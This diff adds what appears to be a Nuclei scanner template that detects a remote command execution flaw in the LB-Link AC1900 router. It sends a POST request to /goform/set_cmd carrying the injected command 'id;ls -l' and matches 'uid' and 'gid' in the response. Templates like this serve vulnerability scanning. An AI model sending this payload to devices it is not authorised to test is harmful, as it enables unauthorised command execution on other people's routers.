@@ -1,0 +1,32 @@
+id: LB-Link-AC1900-RCE
+
+info:
+  name: LB-Link-AC1900-RCE
+  author: iSee857
+  severity: high
+  description: LB-Link-AC1900-RCE
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /goform/set_cmd HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Content-type: application/x-www-form-urlencoded
+        Connection: close
+
+        cmd=id;ls%20-l
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid"
+          - "gid"
+        condition: and
+        part: body
+
+      - type: status
+        status:
+          - 200
